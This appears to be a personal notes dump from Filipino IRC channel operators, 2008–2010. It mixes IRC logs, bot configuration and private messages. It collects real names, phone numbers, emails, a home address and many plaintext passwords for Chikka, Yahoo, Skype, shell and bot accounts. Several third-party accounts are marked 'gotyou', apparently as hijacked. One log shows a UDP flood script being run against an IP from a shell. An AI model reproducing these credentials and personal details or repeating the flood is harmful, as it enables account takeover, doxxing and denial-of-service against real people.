+Nickserv Information: kodie is a registered nick
+Idle: 1min 17secs
+SignOn: Wednesday, October 15th, 2008 at 8:41 PM
+*+*+*+*+* [ End of Intel Report ] *+*+*+*+*
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: GoTTHaRD (~Dandu@acl1-1381bts.gw.smartbro.net)
+ Real Name: GoTTHaRd OneLiFeOneSouL
+ Channels: #makati #ateneo
+ Server: mozilla.se.eu.dal.net - Mozilla.
+ NickServ Info: GoTTHaRD has identified for this nick
+ Idle: 4mins 7secs
+ SignOn: Wednesday, October 15th, 2008 at 11:06 PM
+ ---------------[ Reported 23:25:31 ]---------------
+
+
+ TOTAL points Top 10 -  #1  ^^Ur4GiViNG^^ 52767311  #2  ``Annie 50322782  #3  hazelbrown2 44390571  #4  EaGLe42 25607167  #5  honeycured 22657919  #6  LIZA-SMILE 22583892  #7  Kennette 12148294  #8  Bolan 11349627  #9  corazondexocoatl 10659597  #10  gabs22 8235702 
+
+#6  honeycured 22663919
+
+
+
+|_airheart_| (4740heart@server1.bouncer4you.de) was last seen parting #pinas-trivia 11 days, 11 hours, 37 minutes ago stating "{}".
+
+[22:44] -NickServ- Info for |_airheart_|:
+[22:44] -NickServ- Last seen address : ~eeeeee@acl1-294bts.gw.smartbro.net
+[22:44] -NickServ- Last seen time    : Thu 16-Oct-2008 12:46:06 UTC
+[22:44] -NickServ- Time registered   : Tue 22-Jul-2008 14:47:41 UTC
+[22:44] -NickServ- Time now          : Thu 16-Oct-2008 14:44:01 UTC
+[22:44] -NickServ- Options: Enforced
+[22:44] -NickServ- *** End of Info ***
+
+
+[17:54] <siLverbLade> !seen *airheart*
+[17:54] <kryptoBOT> I found 7 matches to your query.  Here are the 5 most recent (sorted): |_airheart_| airheart|ZZZzz airheart airheart|afk Sleeping_with_AirHeart. |_airheart_| (4740heart@server1.bouncer4you.de) was last seen parting #pinas-trivia 12 days, 6 hours, 47 minutes ago stating "{}".
+[17:55] <siLverbLade> !seen *Sleeping_with_AirHeart*
+[17:55] <kryptoBOT> Sleeping_with_AirHeart (~Toe@90.177.33.65.cfl.res.rr.com) was last seen changing nicks to Toe_Knee on #pinas-trivia 14 days, 22 hours, 51 minutes ago.
+
+[17:52] -NickServ- Info for |_airheart_|:
+[17:52] -NickServ- Last seen address : 4740heart@server1.bouncer4you.de
+[17:52] -NickServ- Last seen time    : Thu 16-Oct-2008 23:33:23 UTC
+[17:52] -NickServ- Time registered   : Tue 22-Jul-2008 14:47:41 UTC
+[17:52] -NickServ- Time now          : Fri 17-Oct-2008 09:52:42 UTC
+[17:52] -NickServ- Options: Enforced
+[17:52] -NickServ- *** End of Info ***
+
+
+
+[17:56] <@siLverbLade> .seen *!*@acl1-294bts.gw.smartbro.net
+[17:56] <@coreblitz> I found 2 matches to your query (sorted): rynz bynz. rynz (~rynz@acl1-294bts.gw.smartbro.net) was last seen quitting from #cebu 1 day, 19 hours, 11 minutes ago stating (Quit: {}).
+[17:56] <@siLverbLade> !seen rynz
+[17:56] <@BlackWater> rynz (~rynz@acl1-294bts.gw.smartbro.net) was last seen quitting from #makati 1 day, 19 hours, 12 minutes ago stating (Quit: {}).
+[17:57] <@siLverbLade> !seen bynz
+[17:57] <@BlackWater> bynz (rynz@acl1-294bts.gw.smartbro.net) was last seen parting #makati 1 day, 19 hours, 13 minutes ago stating "{}".
+[17:57] <@snowbeLLe> rynz (~rynz@acl1-294bts.gw.smartbro.net) was last seen quitting from #makati 1 day, 19 hours, 12 minutes ago stating (Quit: {}).
+[17:57] <@snowbeLLe> bynz (rynz@acl1-294bts.gw.smartbro.net) was last seen parting #makati 1 day, 19 hours, 13 minutes ago stating "{}".
+
+
+
+
+[01:56] -NickServ- Info for PaPeRDoLL:
+[01:56] -NickServ- Last seen address : ~doll@122.55.67.21
+[01:56] -NickServ- Last seen time    : Sun 05-Oct-2008 05:10:46 UTC
+[01:56] -NickServ- Time registered   : Sat 27-Sep-2008 13:19:48 UTC
+[01:56] -NickServ- Time now          : Sun 19-Oct-2008 17:56:09 UTC
+[01:56] -NickServ- Options: Enforced
+[01:56] -NickServ- *** End of Info ***
+
+
+[01:59] -NickServ- Info for CaNdY_25^F:
+[01:59] -NickServ- Last seen address : ~whoiskapa@122.55.67.21
+[01:59] -NickServ- Last seen time    : Tue 07-Oct-2008 02:36:31 UTC
+[01:59] -NickServ- Time registered   : Thu 11-Sep-2008 10:32:32 UTC
+[01:59] -NickServ- Time now          : Sun 19-Oct-2008 17:59:39 UTC
+[01:59] -NickServ- Options: Enforced
+[01:59] -NickServ- *** End of Info ***
+
+[02:03] <+coreblitz> I found 2 matches to your query (sorted): Guest13626 CheFSnooZE. Guest13626 (~peeweebar@122.55.67.21) was last seen changing nicks to pagnotta_cool on #pinas-trivia 2 days, 7 hours, 55 minutes ago.
+
+
+
+CheskaMyBaby Reyes (10/17/2008 10:27:16 AM): huhuhuhuhuhu...namimiss kita ng sobra pero wala akong magawa...kung alam mo lang gaano din kahirap saken...huhuhuhuhu..buti ka pa pwede kang magmsg at magtxt kahit di ako nakakasagot pero alam mo bang mas mahirap yun saken kasi kahit gusto kita sagutin di pwede..baka lalo lang lumala situation...huhuhuhuhuhu...tumawag si mom ko, baka nxt wk aalis na ako for HK...nov first wk uwi sya...huhuhuhuhuhuhuhu
+
+
+Cheska (10/17/2008 10:24:52 AM): huhuhuhuhuhuhu.....ang hirap talaga...pero kaya natin...kailangan nating kayanin....huhuhuhuhuhuhu...sana alam mo kung namimiss mo ko lalo na me...ikaw pwede ka pang mag email at magmsg saken pero ako hirap na hirap kc d tlaga pwede..parang lahat ng kilos ko may nakatingin...huhuhuhuhu....
+
+
+www.itypeit.net
+
+
+
+003940344
+roxy_rose28@yahoo.com
+
+007655943
+karen05_aduna@yahoo.com
+
+006673625
+slapshock_neil@yahoo.com
+
+004489994
+sirricarte2008_pnhs@yahoo.com
+
+
+cnbrabdullah@yahoo.com <<<<<<< NEW
+
+639175061837
+639208332503
+alemap 639167812952
+desiree 639189360687
+dondon-globe 639272353206
+eloelo 639283261760
+francis 639179977823 florabel vicencio
+james 007212022
+jhed 639185950744
+Jhed nacpil 639195298857
+kimadriano 639162205958
+matt 639186523426
+matt2 639202234653         2234653@yahoo.com <<----- not taken
+
+002035926
+
+mike 639167131202
+nenoth 639208318491
+Paul 639206429183
+Richie 639176299824
+Totep 639172037040   002037040 joseph_rain15@msn.com  <<<<<<<<<<<<< GOT YOU!
+yjhen 639164840790   4840790 joyce_sapitanan@yahoo.com
+
+
+jhed quizon 002031195 4x4computers
+Joseph sibug 002812875
+639157421517 heart eyes
+639163916959
+639175061837
+ewan 639186523426
+James 639209044511
+James 639198553790    central_colleges@yahoo.com
+Laurence Del puerto 001602408 lord_laurence2002@yahoo.com
+Marichu abejuela 639277293862
+SenedyBorja 639173702164
+
+
+639167428672
+
+
+jebbee19@hotmail.com <<<--- gotyou
+laaerni@yahoo.com <<<----gotyou
+periwinkle.chic@yahoo.com <<<<-----gotyou
+bryx1983@yahoo.com <<<--------gotyou
+luvc_teish@yahoo.com <<-------gotyou  0056456489 roan
+allerei214@yahoo.com <<<<------gotyou
+trixer214@yahoo.com <<<---------
+
+micoantonio_69@yahoo.com <<<<--- gotyou
+jhonnel2001@yahoo.com <<<<<---- gotyou!!
+bukopie_1983@yahoo.com <<<<---gotyou!!
+caaede@yahoo.com <<<-----gotyou!!
+desikoy26@ya
+janice10148@yahoo.com <<<------gotyou!!!
+monkeyorganism@yahoo.com <<<----gotyou!!
+racerbigbadboy@yahoo.com <<<-----gotyou!!
+
+
+006543335 chikoy@tambayanet.com
+
+
+moongoos3@hotmail.com Kay Zee Kenneth Conrad
+maldita51180@hotmail.com
+michaell595@hotmail.com
+beltran_family@hotmail.com  Paul Albert Beltran
+francis_dipon@hotmail.com
+hogwartsmafia@hotmail.com
+jingco_harold@hotmail.com
+shift213@hotmail.com
+torpido13@hotmail.com Bryan Marasigan
+
+
+639192943111
+xx 003803666 blackspy@hotmail.com
+xx 003056259 Louie
+joyce 639067142198
+laarni 639183990001 laarniliki@yahoo.com  <<<<<<<<<<<-----gotyou!!
+laarninew 639269604499
+maricon 639106121531 mhalditah20@yahoo.com
+007108802 king_louiex@yahoo.com
+mike lagas 639167131202
+gia ganda 639175776253
+dondon-globe 639157421517
+alvin 639196505511
+
+
+0056444381010 iannemaevic@yahoo.com <<--- gotyou!!
+
+
+spunky_4u_2luv
+nikeshi_niomi
+ jhonnel2001
+shadowacc16@yahoo.com
+micoantonio_69@yahoo.com
+ronaldblancaflor@yahoo.com
+cary8kite@yahoo.com
+cute_na_sweet_fa
+alemap_22@yahoo.com
+angelofdarkrider@yahoo.com
+britchel30_vicbrentmoks45978@yahoo.com
+bukopie_1983@yahoo.com
+charles_craw@yahoo.com
+jayrreyes@yahoo.com
+
+peewee16@eudoramail.com
+
+
+
+
+MyBaby: Huhuhuhu.. i miss you so much T_T
+Nkapunta ka na pala ng hk di na ako nkapag paalam sau T_T madami pa naman sana ako emails for you.. huhuhuhuhuhu...
+MyBaby: Sobrang miss kita... i will not forget my promise...
+MyBaby: Mahal na mahal kita Cheska Nicole..
+
+
+005786473 boyet69
+
+639195786473
+639176673625
+
+===============
+Your Chikka Account password is:
+jasivy
+your Chikka-ID (0056444381010) or your email address (IANNEMAEVIC@YAHOO.COM).
+===============
+
+
+PinkyRey 001435280 mylabs20
+PHIWAY 09/03/1968
+
+
+padme 00220412
+
+
+minetterey  002664269 jessamine_mycah_rey@yahoo.com
+
+josephrey 639192078676  639159940262  639189078518
+
+
+
+=================
+Your Chikka Account password is:
+laarni
+your Chikka-ID (639183990001) or your email address (laarniliki@yahoo.com).
+=================
+
+
+=================
+Your Chikka Account password is:
+adrian02
+your Chikka-ID (00008221991) or your email address (allerei214@yahoo.com).
+=================
+
+
+
+
+=================
+Your Chikka Account password is:
+3374733
+your Chikka-ID (002562067) or your email address (periwinkle.chic@yahoo.com).
+=================
+
+
+
+=================
+Your Chikka Account password is:
+spoiled
+your Chikka-ID (002028207) or your email address (bryx1983@yahoo.com).
+=================
+
+
+
+=================
+Your Chikka Account password is:
+iloveyouelaine
+your Chikka-ID (0092064459233) or your email address (luvc_teish@yahoo.com).
+=================
+
+
+
+=================
+Your Chikka Account password is:
+heaven
+your Chikka-ID (009910304) or your email address (trixer214@yahoo.com).
+=================
+
+
+
+
+chesnik20010@yahoo.com
+Your Chikka Account password is:
+cheska
+your Chikka-ID (007025479) or your email address (chesnik20010@yahoo.com).
+
+
+
+=================
+Your Chikka Account password is:
+008300013044
+your Chikka-ID (002037040) or your email address (joseph_rain15@msn.com).
+=================
+
+=================
+Your Chikka Account password is:
+caede
+your Chikka-ID (0000122781) or your email address (jebbee19@hotmail.com).
+=================
+
+
+
+
+
+Hello markvision,
+Please take a moment right now to write down your nick password.
+The password you chose is: pinkymahalko5280
+
+yokihc
+pinkyiloveyou5280
+
+#honeycured
+baconorham1234567890
+
+
+mark_chester_rey@yahoo.com
+mcfrey93
+
+kuya at si chikay pero si chichi
+mc/cacay/chichi
+
+
+http://calendar.yahoo.com/nicole_reyes20
+
+
+[23:43] [RaNdY] handle: Guardian_
+[23:43] [RaNdY] pass: $$Makat1B0t
+[23:49] [RaNdY] telnet: scalar.cluenet.org port:54124
+encode 54125
+
+
+
+http://www.samair.ru/proxy/
+http://img222.imageshack.us/img222/6111/logo02gad1.jpg
+
+rxbot
+
+
+http://www.mapua.edu.ph/Images/Main/Body/BGSilver.jpg
+http://img168.imageshack.us/img168/3702/ninjabluevf2.jpg
+
+XBOX360ELITE
+
+
+[20:22] [Guardian_X] /server -m phcore.com 9911 r0b0t1c5
+[20:22] [Guardian_X] tapos
+[20:22] [Guardian_X] /quote main r0b0t1c5sss
+[20:22] [Guardian_X] /quote vip phcore.com
+[20:22] [Guardian_X] /conn irc.dal.net
+
+
+cLaRiUs15 - selling sun earring..
+
+[17:56] [RaNdY] makati.ph@gmail.com - 01312009
+[17:56] [RaNdY] si kisses may hawak ng friendster account
+[17:56] [RaNdY] ako lang yung naglagay ng pics
+
+[19:06] [RaNdY] yun bot auth kay makati is: randy123
+[19:06] [RaNdY] para owner
+
+[19:09] [RaNdY] pinoyshells.com l/p:MMDA/makati2008
+
+
+[20:57] [RaNdY-] proxy.smartbro.net proxy80 (proxy.smartbro.net) to sneakers 
+[20:57] [RaNdY-] proxy.smartbro.net proxy8080 (proxy.smartbro.net) to sneakers 
+
+
+------------- Count Result --------------
+#davao currently has 70 active clients.
+Statistics: 70/224 is active ( 31.25% )
+Remarks: 154 nick(s) might be using psyBNC
+------- 19/02/2009 18:44:48 HRS -------
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: Aleks (~Aleks@alekz.org)
+ Real Name: stfu and rtfm
+ Channels: #makati @#opers @#bnc +#bicol #davao
+ Server: mozilla.se.eu.dal.net - Mozilla.
+ NickServ Info: Aleks has identified for this nick
+ Idle: 8secs
+ SignOn: Thursday, February 19th, 2009 at 5:45 PM
+ ---------------[ Reported 20:28:18 ]---------------
+
+
+channels.dal.net/ravescript  $$r4v32009
+
+
+
+
+[11:59] <excoder> adduser chic:sneakers
+[11:59] [-psyBNC] Mon Feb 23 19:59:17 :New User:chic (sneakers) added by unix
+[11:59] <excoder> password chic:JJCheryL0218
+[11:59] [-psyBNC] Password for chic changed to 'JJCheryL0218'
+
+/server arbelos.cluenet.org 51443
+username: chic (change email add to chic@sneakers.com)
+password: JJCheryL0218 (/quote pass JJCheryL0218)
+
+
+[18:12] * @chizky hmmmm.. i wont be online since tom...sorry but i have some things to settle..and i hope u will respect my decision..bos kankouni..madam yanny..i appreciate everything..i really did...but i have to face new things in my life that i am forced to give this up...love u guys...im gonna miss u all..God bless po...:-P... love u guys... love u jj even if things are so complicated i still chose to love u
+[18:13] * @chizky (~chic@0x50a14d86.boanxx14.dynamic.dsl.tele.dk) Quit (Quit: im outta here! for real!!!!!!!!!!!! God bless love u all...) ( RAVE v3.02 © 2009 )
+
+#hackers.ph hackmenot
+
+124.217.119.155 SUN
+222.127.12.76 GLOBE
+
+
+[03:35] <@sneakers> ------------- Count Result --------------
+[03:35] <@sneakers> #makati currently has 89 active clients.
+[03:35] <@sneakers> Statistics: 89/119 is active ( 74.79% )
+[03:35] <@sneakers> Remarks: 30 nick(s) might be using psyBNC
+[03:35] <@sneakers> ------- 02/03/2009 03:33:31 HRS -------
+
+[04:13] <Atlantis> ------------- Count Result --------------
+[04:13] <Atlantis> #davao currently has 37 active clients.
+[04:13] <Atlantis> Statistics: 37/111 is active ( 33.33% )
+[04:13] <Atlantis> Remarks: 74 nick(s) might be using psyBNC
+[04:13] <Atlantis> ------- 02/03/2009 04:12:15 HRS -------
+
+
+So goodbye for now~ And I'll see you again~ Some way, somehow~ When it's my time to go~ To the other side~ I'll hold you again~ And melt at your smile~ Now all I have~ Are the ones that I'm with~ And you taught me not~ To take for granted~ The time that we have~ To show that we care~ Speak into their minds~ And their hearts~ While they're here~ And say I love you...
+
+
+    sockwrite -n $sockname GET /whois/?queryinput= $+ %ip HTTP/1.1
+    sockwrite -n $sockname Host: ws.arin.net
+
+
+[21:37] * +chizky (~pringles@0x50a14168.boanxx14.dynamic.dsl.tele.dk) Quit (Quit: ill be missin u...i really dont understand everything but i chose to obey and i still have faith...i love u jj...hope one day out path will meet again...and by that time i will never let you go...chic :() ( RAVE v3.02 © 2009 )
+
+[21:56] Closing Link: 97.107.129.173 (Quit: it's hard to say Goodbye.. but if I really need to... then what can I do... farewell my love... i'll never forget you...)
+
+
+http://www.eggheads.org/redirect.php?url=ftp://ftp.eggheads.org/pub/eggdrop/source/1.6/eggdrop1.6.19.tar.gz
+
+http://www.pandorabots.com/pandora/talk?botid=8a1b6c07ee3757f8
+
+
+
+
+[20:35] <@darkchild> .+bot nick address:port   <--- sa leaf
+[20:35] <@darkchild> .chattr nick +of <-- both
+[20:35] <@darkchild> .botattr nick +s <--- hub
+[20:36] <@darkchild> .botattr nick |+g <--- hub	
+
+[20:36] <@darkchild> tapos sa leaf ulit:  .botattr nick +pgh
+
+HUB: 
+.+bot nick
+.chattr botnick +of
+.botattr botnick +s
+.botattr botnick |+g
+
+LEAF:
+
+.+bot snowbelle 64.85.172.214:54124
+.+bot encode 64.85.172.214:54125
+.+bot Makati 72.14.182.171:54129
+.+bot PHCore 64.32.23.250:9999
+.+bot dcoder 79.170.90.65:9999
+.+bot unixcode 97.107.129.173:53124
+.+bot acronix 74.143.81.119:53120
+
+.chattr hubnick +of
+.botattr hubnick +pgh
+
+sci.face.edu 9999 = PiNoY
+
+In the unix world you are considered a hacker if you modify code or scripts to serve a legitimate purpose. Some call these guy "white hat" hackers; if you ever have modified something to fit your needs, it is considered a hack.
+
+
+Once I dropped a tear in the ocean, the day I find it is the day I'll stop loving you.
+
+/msg unixcode auth $$plantron1x
+
+http://2tu.us/cgt -- #makati stats
+
+
+[20:17] [|nTeL^] pinoyshells.com:22
+[20:18] [|nTeL^] swat:randyspikesneakers
+
+
+ ---------------[ RAVE InteL Report ]---------------
+ Whois On: cool_dude (~.@124.104.150.89)
+ Real Name: wqeq
+ Server: krypt.ca.us.dal.net - http://www.krypt.com - 100gbit of AWESOME.
+ Idle: 8secs
+ SignOn: Wednesday, April 8th, 2009 at 10:49 PM
+ ---------------[ Reported 23:13:04 ]---------------
+
+
+http://www.youtube.com/watch?v=ZKU15LUez8U
+
+
+
+
+http://122.54.180.118/shoutcast/rnb1.lst
+http://122.54.180.118/shoutcast/alternative.lst
+http://122.54.180.118/shoutcast/techno.lst
+http://122.54.180.118/shoutcast/lahat.lst
+
+
+$makat1dj $$makat1adm1n d0ntm3ssw1thu5
+Makat1Adm1nDJ
+
+[12:00] #grawity@snoWater# botinfo
+[12:01] Telnet connection: sine.cluenet.org/59327
+[12:01] Logged in: grawity (grawity@sine.cluenet.org/59327)
+[12:01] #grawity# who
+[12:01] DCC connection closed (grawity!grawity@sine.cluenet.org)
+[12:01] Refused DCC chat (no access): grawity!grawity@sine.cluenet.org
+[12:01] CTCP CHAT: CHAT 1634435914 55112 from grawity (grawity@sine.cluenet.org)
+[12:02] CTCP VERSION:  from grawity (grawity@sine.cluenet.org)
+
+
+[21:47] <@chizky> ym:chikay143@yahoo.com
+[21:47] <@chizky> pass:28378872
+[21:47] <@chizky> skype : chikay143@yahoo.com
+[21:47] <@chizky> pass: angel
+
+micchic@excite.com
+
+
+[15:16] * @sneakers (~unix@96-28-96-206.dhcp.insightbb.com) Quit (Quit: you're the best thing that ever happened to me.. i love you more than words could ever say.. it's you I want to be with til the end of my days.. some people ask me why? It's because my heart beats for you ever since I was born.. Love you always babychic ko :))
+
+
+cluenet siLverbLade Makati-Admin
+
+[15:14] [RaNdY] http://www.iraniazad.org/proxylist/
+[15:14] [RaNdY] http://proxyhell.blogspot.com/
+
+
+Cheryl A. Besavilla
+21 Drosselvej, 2000 Frederiksberg, Denmark
+
+‡πèÕ°ÃØ‡πèÔ¥ø ‡πèÕ°ÃØ‡πèÔ¥ø ‡πèÕ°ÃØ‡πèÔ¥ø 
+‡πë€©€û€©‡πë
+[‚îå‚à©‚îê(‚ó£_‚ó¢)‚îå‚à©‚îê]
+
+[14:42] [|nTeL^] unixcod
+[14:42] [|nTeL^] tsaka piata
+[14:42] [|nTeL^] meron pa ngan scan japan e
+
+//msg eggdrop $+($chr(1),$chr(1))
+
+[00:12] <@chic> @locate 203.177.87.107
+[00:12] <@unixcode> chic IP information for 203.177.87.107: Country: PHILIPPINES, City: MANILA, ISP: SYKES, Domain: -
+[00:13] <@siLverbLade> hahahaha
+[00:18] <@chic> @locate 203.177.87.98
+[00:18] <@unixcode> chic IP information for 203.177.87.98: Country: PHILIPPINES, City: MANILA, ISP: SYKES, Domain: -
+
+[01:10] <@deyb> deamonknight
+http://images.albernabe.multiply.com/image/6/photos/6/400x400/24/collage17.jpg?et=zvOupcLWCg2XZh9fYkqTGw&nmid=48617130
+http://albernabe.multiply.com/
+
+
+[01:54] <ActiveCAD> Counting active clients on #djkorn please standby...
+[01:55] <ActiveCAD> ------------- Count Result --------------
+[01:55] <ActiveCAD> #djkorn currently has 55 active clients.
+[01:55] <ActiveCAD> Statistics: 55/205 is active ( 26.83% )
+[01:55] <ActiveCAD> Remarks: 150 nick(s) might be using psyBNC
+[01:55] <ActiveCAD> ------- 31/07/2009 01:54:28 HRS -------
+
+
+[19:33] <+BlackWateR> Last login: Tue Jun 23 18:06:45 2009 from 211.75.183.115
+[19:33] <+BlackWateR> Sun Microsystems Inc.   SunOS 5.8       Generic Patch   February 2004
+[19:33] <+BlackWateR> $ cd /tmp
+[19:33] <+BlackWateR> $ cd .a
+[19:33] <+BlackWateR> $ perl udp.pl 78.101.177.167 0 0
+[19:33] <+BlackWateR> udp flood - odix
+
+skat pige
+urskat@yahoo.com
+
+
+KanKouni
+95.66.98.73
+
+
+http://www.fileden.com/files/2007/11/11/1578216/nate01.mp4
+http://www.fileden.com/files/2007/11/11/1578216/nate02.mp4
+
+tty 78.101.177.167
+
+
+[22:38] +[RaNdY]+ ikaw na lang kalikot ng domain
+[22:38] +[RaNdY]+ http://register.com
+[22:39] +[RaNdY]+ login:hellspike
+[22:39] +[RaNdY]+ pass:makati
+
+
+[22:44] <@RaNdY> 72.20.29.179
+
+[23:03] [RaNdY] Successfully added (unix) to the user database.
+[23:03] [RaNdY] Password: sneakerschizky_)(*&^%$#@!lskdsad2!!##$1
+[23:03] [RaNdY] libra.cyberhosters.org 22 $$plantron1x
+[23:43] <@RaNdY> http://www.CyberHosters.Org/libra.php
+
+sneakers.chic.xp.cx
+
+pentium
+
+
+[23:07] -NickServ- Your request to DROP the nickname makati must be confirmed.
+[23:07] -NickServ- Please check your email address for further instructions.
+[23:07] -NickServ- Your email address is currently set to: etrum11@yahoo.com
+
+
+
+admin.codeunix.com ---> 72.8.189.109
+randy.codeunix.com ---> 72.8.189.91
+
+
+
+[6:28:38] babychic: 470 469 496 - TeamViewer
+470 370 978
+
+server - 470 867 852
+
+CS1.6 -http://www.megaupload.com/?d=S9W9NQBW
+
+
+makati.dalnet@yahoo.com s3rvertechnol0gy 1l0v3myb4byj0shs0muc4
+
+
+arla.a.penaflorida@nxp.com
+(02) 8445139 local 2125
+sa bahay (049) 5124109
+
+
+ Whois On: noy4 (~noy4@112.202.141.93)
+
+
+FS Ru10fU5
+
+[23:07] -[ RaNdY ]- http://users.smartgb.com/g/g.php?a=a&i=g18-28592-e0
+[23:07] -[ RaNdY ]- password: cocacola
+
+
+makati.operators@gmail.com
+created: Jan 23, 2010
+
+control panel test drive: http://castdemo.centova.com/login/index.php
+
+
+http://picasaweb.google.com/acronix83/Camchic?authkey=Gv1sRgCMaB0eTt0MCtwwE#
+http://picasaweb.google.com/acronix83/JoshuaCheryl?authkey=Gv1sRgCLW89YbxtIncGg#
+
+
+Forum MySQL pass: acronix @robot1cs83
+
+
+
+!@#$%good
+[23:51] [RaNdY] OK? (yes/no): yes
+[23:51] [RaNdY] adduser: INFO: Successfully added (unix) to the user database.
+[23:51] [RaNdY] Add another user? (yes/no): no
+[23:51] [RaNdY] Goodbye!
+[23:51] [RaNdY] [root@virgo (~):519]>
+$$plantron1x
+
+virgo.cyberhosters.org - port 22
+
+
+[02:52] -(CodeX): [RAVE]: Your password is now set to: $$plantron1x, remember your password for future use.
